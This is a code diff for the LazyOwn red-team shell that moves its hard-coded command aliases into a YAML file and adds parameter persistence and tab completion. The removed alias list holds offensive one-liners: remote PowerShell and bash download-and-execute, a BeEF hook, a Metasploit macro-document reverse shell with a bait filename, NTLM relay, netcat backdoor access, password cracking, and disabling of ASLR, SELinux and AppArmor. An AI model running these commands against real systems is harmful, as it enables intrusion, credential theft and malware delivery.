@@ -24,6 +24,11 @@ import cmd2
 from cmd2 import CommandSet, with_argparser, with_category, with_argument_list
 from utils import *
 from modules.ai_model import OllamaModel
+from cli.aliases import load_aliases as _load_aliases
+from cli.assign import apply_assign as _apply_assign
+from cli.registry import register_command_sets as _register_command_sets
+from cli.show import format_payload as _format_payload
+from core.config import save_payload as _save_payload
 
 with open('payload.json', 'r') as file:
     config = json.load(file)
@@ -111,122 +116,8 @@ class LazyOwnShell(cmd2.Cmd):
     api_key = config.api_key
     domain = config.domain
 
-    aliases = {
-        "available_filter_functions": "sh sudo cat /sys/kernel/tracing/available_filter_functions",
-        "available_filter_functions_debug": "sh sudo cat /sys/debug/kernel/tracing/available_filter_functions",
-        "available_filter_functions_addrs": "sh sudo cat /sys/kernel/tracing/available_filter_functions_addrs",
-        "available_filter_functions_addrs_debug": "sh sudo cat /sys/debug/kernel/tracing/available_filter_functions_addrs",
-        "amnesiac": "sh pwsh -Command \"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1');Amnesiac\"",
-        "atomic_update":"sh cd external/.exploit/atomic-red-team && git pull",
-        "auto": "pyautomate",
-        "autonuclei": f"sh bash -i \"nuclei  <(xq '.nmaprun.host[].address.\"@addr\"' sessions/scan_{rhost}.nmap.xml) -t ../nuclei-templates/\"",
-        "aslr": "run lazyaslrcheck",
-        "asm": "sh /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb",
-        "backdoor": f"sh rlwrap --always-readline nc {rhost} 31337",
-        "beef_payload":f"sh echo '<script src=\"http://{lhost}:3000/hook.js\"></script>' > sessions/beef_payload.html",
-        "bettercap_netrecon":"sh sudo bettercap -eval 'net.recon on'",
-        "cc": f"sh firefox -kiosk https://{lhost}:4444/ 2>/dev/null",
-        "caja": "sh caja sessions",
-        "chown": "sh sudo -s chown 1000:1000 . -R",
-        "control_dynamic_debug": "sh sudo cat /sys/kernel/debug/dynamic_debug/control",
-        "coerce_plus": f"sh netexec smb {rhost} -u {start_user} -p '{start_pass}' -d {domain} -M coerce_plus -o LISTENER={lhost}",
-        "creds": "sh cat sessions/credentials*",
-        "cloudflare_tunnel": f"sh bash modules/mkcloudflaretunnel.sh {c2_port}",
-        "disable_ftrace": "sh sudo sysctl kernel.ftrace_enabled=0",
-        "disable_ftrace_proc": "sh sudo echo 1 > /proc/sys/kernel/ftrace_enabled",
-        "disable_aslr": "sh echo 0 | sudo tee /proc/sys/kernel/randomize_va_space",
-        "diable_selinux": "sh sudo setenforce 0",
-        "disable_apparmor": "sh sudo systemctl stop apparmor",
-        "discovery": "run lazynmapdiscovery",
-        "dolphin": "sh dolphin sessions&",
-        "duckdns": "sh bash modules/duckdns.sh",
-        "ed": "sh nano payload.json",
-        "empire_client": "sh sudo powershell-empire client",
-        "empire_server": "sh sudo powershell-empire server",
-        "enable_aslr": "sh echo 2 | sudo tee /proc/sys/kernel/randomize_va_space",
-        "enabled_functions": "sh sudo cat /sys/kernel/tracing/enabled_functions",
-        "enabled_functions_debug": "sh sudo cat /sys/debug/kernel/tracing/enabled_functions",
-        "enabled_search_by_hidden_pids": "sh sudo echo 0 > /proc/sys/kernel/ftrace_enabled",
-        "enabled_ftrace": "sh sudo sysctl kernel.ftrace_enabled=1",
-        "event_trace": "sh sudo cat /sys/kernel/debug/tracing/trace",
-        "ftpd": "sh cd sessions && python3 -m pyftpdlib -p 2121 -w",
-        "ftpsniff": "run lazyftpsniff",
-        "gdb": "set debug true",
-        "get_all_domains": "sh curl -s \"https://crt.sh/?q=%.{domain}&output=json\" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u > sessions/{domain}_all_domains.txt && cat sessions/{domain}_all_domains.txt".replace('{domain}', domain),
-        "halt": "sh sudo shutdown -h now",
-        "hash": "sh cat sessions/hash*",
-        "hosts": "sh sudo nano /etc/hosts",
-        "hosts_discover": "sh ./modules/hostdiscover.sh",
-        "iasniff": "sys sudo python3 modules/ia_network_analysis.py --mode console",
-        "info": "sh echo \"<?php phpinfo(); ?>\" > sessions/info.php",
-        "install_shark": 'sys cd external/.exploit/shark && sudo wget -qO- https://github.com/Bhaviktutorials/shark/raw/master/setup | sudo bash',
-        "ipy": "sh ipython3",
-        "loot": "sh ls /home/$USER/.msf4/loot/ && cp /home/$USER/.msf4/loot/* ./sessions/ -r",
-        "ls": "list",
-        "lsof": "sh sudo lsof -i -P -n | grep LISTEN",
-        "man":"sh bash -c 'cat README.md| gum format'",
-        "mitre_update":"sh cd external/.exploit/mitre && git pull",
-        "moo": "sh cowthink -bdgpstwy LazyOwn RedTeam Framework. The best OpSec T00l",
-        "nf": f"sh ./modules/nf -d {rhost} -o sessions/{rhost}_nuclerfuzzer",
-        "nmap_ldap_rootdse": f"sh sudo nmap -Pn --script ldap-rootdse.nse {rhost}",
-        "nmcli": f"sh nmcli dev show {device}",
-        "nxcridbrute": f"sh nxc smb {rhost} -u 'anonymous' -p '' --rid-brute 3000",
-        "ntlmrelayx": f"sh ntlmrelayx.py --raw-port 6667 -t http://{domain}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
-        "kallsyms": "sh sudo cat /proc/kallsyms",
-        "kvpn":"sh sudo killall openvpn",
-        "nmap": "run_script \"/home/grisun0/LazyOwn/lazyscripts/lazynmap.ls\"",
-        "ntp" : f"sh sudo ntpdate pool.ntp.org",
-        "ntp_rhost" : f"sh sudo ntpdate {rhost}",
-        "now": "clock",
-        "notes": "sh nano sessions/notes.txt",
-        "p": "payload",
-        "py": "sh python3 -i",
-        "pass": "sh head -c 100 /dev/urandom | base64 | head -c 12 | xclip -sel clip",
-        "poison": "run lazylogpoisoning",
-        "powersploit":"sh powersploit -h",
-        "pwnat": "sh pwnat -s 8080",
-        "q": "exit",
-        "qq": "run_script \"/home/grisun0/LazyOwn/lazyscripts/lazyquit.ls\"",
-        "report":f"sh export GROQ_API_KEY='{api_key}' && python3 report.py",
-        "rtpflood" : "sh sudo bash modules/lazyrtpflood.sh",
-        "randomuser": "sh curl 'https://randomuser.me/api/' -H 'Accept: application/json' | jq",
-        "rustrevmakerwin": f"sh cd sessions ; bash ../modules_ext/rustrevmaker/RustRevMaker.sh windows {lhost} {lport}",
-        "rustrevmakerlin": f"sh cd sessions ; bash ../modules_ext/rustrevmaker/RustRevMaker.sh linux {lhost} {lport}",
-        "showmount": f"sh showmount -e {rhost}",
-        "t": "sh python3 modules/lazypyautogui.py",
-        "tcpdump":"sh sudo tcpdump -np 'tcp[tcpflags] ^ (tcp-syn|tcp-ack) == 0'",
-        "tcpdumpl":"sh sudo tcpdump -npAq -s0 'tcp and (ip[2:2] > 60)'",
-        "tcpdumpt":"sh sudo tcpdump -np -i tun0 'tcp[tcpflags] ^ (tcp-syn|tcp-ack) == 0'",
-        "tor": "sh sudo bash sessions/tor.sh",
-        "trace": "sh sudo cat /sys/kernel/tracing/trace",
-        "touched_functions": "sh sudo cat /sys/kernel/tracing/touched_functions",
-        "s3_annon_enum_aws": f"sh aws s3 ls s3://{domain}/ --no-sign-request --region us-east-1",
-        "s3_annon_sync_aws": f"sh aws s3 sync s3://{domain}/ sessions/s3 --no-sign-request --region us-east-1",
-        "smbd": "sh cd sessions && smbserver.py share . -username test -password test",
-        "ses": "sh ls sessions",
-        "sniff": "run lazysniff",
-        "sshr": "sh ssh root@segfault.net",
-        "status": "sh git status",
-        "stop_ntp": "sh sudo timedatectl set-ntp false",
-        "stop_squid": "sh sudo systemctl stop squid",
-        "start_squid": "sh sudo systemctl start squid",
-        "start_ollama": "sh sudo systemctl start ollama",
-        "start_ntp": "sh sudo timedatectl set-ntp true",
-        "stop_ollama": "sh sudo systemctl stop ollama",
-        "stop_tor": "sh sudo systemctl stop tor",
-        "stop_apt": "sh sudo systemctl stop apt-cacher-ng",
-        "start_apt": "sh sudo systemctl start apt-cacher-ng",
-        "spiderfoot":"spiderfoot -l 127.0.0.1:2222",
-        "update": "sh git pull origin main",
-        "unshadow": "sh sudo unshadow sessions/passwd sessions/shadow > sessions/hash.txt && sudo john sessions/hash.txt -w /usr/share/wordlists/rockyou.txt",
-        "venom": "run lazymsfvenom",
-        "vmallocinfo": "sh sudo cat /proc/vmallocinfo",
-        "vuln": 'sh echo "    \033[33m[!] Searchspoit\n    \033[34m[!] The Exploit of the Day (you can use the command: cp path/of/exploit to copy exploit to working sessions directory):\033[32m" ;     searchsploit --cve | shuf -n 1 ',
-        "wps": "sh sudo bash modules/lazywps.sh",
-        "word": f"sh msfconsole -x 'use exploit/multi/fileformat/office_word_macro ; set payload windows/shell/reverse_tcp ; set FILENAME imagenes_novia.docm ; set BODY Hola_este_en_realidad_eres_tu ; set lhost {lhost} ; set lport {lport} ; exploit ; exit -y ' ; msfconsole -x 'use multi/handler ; set lport {lport} ; set lhost {lhost} ; run' ",
-        "ww": "whatweb",
-        "zrc": "sh nano ~/.zshrc",
-    }
+    aliases: dict = {}
+    """Populated at runtime in __init__ from cli/aliases.yaml."""
 
     def __init__(self):
         """
@@ -249,6 +140,14 @@ class LazyOwnShell(cmd2.Cmd):
             startup_script='lazyscripts/startup.ls',
             include_ipy=True,
         )
+        try:
+            self.aliases.update(_load_aliases(load_payload()))
+        except Exception as exc:
+            print_warn(f"failed to load cli/aliases.yaml: {exc}")
+        try:
+            _register_command_sets(self)
+        except Exception as exc:
+            print_warn(f"failed to register CommandSets: {exc}")
         self.ip2asn = IP2ASN()
         #self.persistent_history_file = os.path.join(os.getcwd(), '/LazyOwn_history.txt')
         self.plugins_dir = 'plugins'
@@ -1091,17 +990,17 @@ class LazyOwnShell(cmd2.Cmd):
 
     @cmd2.with_category(miscellaneous_category)
     def do_assign(self, line):
-        """
-        assign a parameter value.
+        """assign a parameter value, persist to payload.json and refresh aliases.
 
-        This function takes a line of input, splits it into a parameter and a value,
-        and assign the specified parameter to the given value if the parameter exists.
+        The mutation is delegated to :func:`cli.assign.apply_assign` which
+        writes ``payload.json`` atomically through :func:`core.config.save_payload`
+        when the parameter is known. After a successful update, aliases are
+        re-rendered so commands like ``backdoor`` or ``coerce_plus`` immediately
+        reflect the new value without a shell restart.
 
-        :param line: A string containing the parameter and value to be set.
-                    Expected format: '<parameter> <value>'.
+        :param line: '<parameter> <value>'.
         :type line: str
         :return: None
-        :raises: ValueError if the input line does not contain exactly two elements.
         """
         args = shlex.split(line)
         if len(args) != 2:
@@ -1109,27 +1008,45 @@ class LazyOwnShell(cmd2.Cmd):
             return
 
         param, value = args
-        if param in self.params:
-            self.params[param] = value
-            print_msg(f"{YELLOW}{param} assign to {GREEN}{value} {RESET}")
-        else:
+        updated = _apply_assign(self.params, param, value, save=_save_payload)
+        if not updated:
             print_error(f"Unknown parameter: {param}{RESET}")
-        return
+            return
+
+        try:
+            self.aliases.update(_load_aliases(self.params))
+        except Exception as exc:
+            print_warn(f"aliases refresh failed after assign: {exc}")
+
+        print_msg(f"{YELLOW}{param} assign to {GREEN}{value} {RESET}")
+
+    def complete_assign(self, text, line, begidx, endidx):
+        """Tab-complete the parameter name from the live payload keys.
+
+        Driven entirely by ``self.params`` so the framework never has to
+        maintain a parallel list of completion targets — adding a new key to
+        ``payload.json`` makes it tab-completable for free.
+        """
+        try:
+            tokens = shlex.split(line[:endidx]) if line else []
+        except ValueError:
+            tokens = line[:endidx].split()
+        index = len(tokens) - (0 if line[:endidx].endswith(" ") else 1)
+        if index != 1:
+            return []
+        return sorted(key for key in self.params if key.startswith(text))
 
     @cmd2.with_category(miscellaneous_category)
     def do_show(self, line):
-        """
-        Show the current parameter values.
+        """Show the current parameter values, sorted and aligned.
 
-        This function iterates through the current parameters and their values,
-        printing each parameter and its associated value.
-
-        :param line: This parameter is not used in the function.
-        :type line: str
-        :return: None
+        Rendering is delegated to :func:`cli.show.format_payload` so the same
+        formatter can be reused by reports, the dashboard or shift-handoff
+        artefacts.
         """
-        for param, value in self.params.items():
-            print_msg(f"{param}: {value}")
+        rendered = _format_payload(self.params)
+        if rendered:
+            print_msg(rendered)
 
     @cmd2.with_category(miscellaneous_category)
     def do_list(self, line):
@@ -2972,6 +2889,10 @@ class LazyOwnShell(cmd2.Cmd):
             for key, value in data.items():
                 if key in self.params:
                     self.params[key] = value
+            try:
+                self.aliases.update(_load_aliases(self.params))
+            except Exception as exc:
+                print_warn(f"aliases refresh failed after payload reload: {exc}")
             print_msg(f"Parameters loaded from {GREEN}{filename}{RESET}")
             self.onecmd("rrhost")
         except FileNotFoundError:
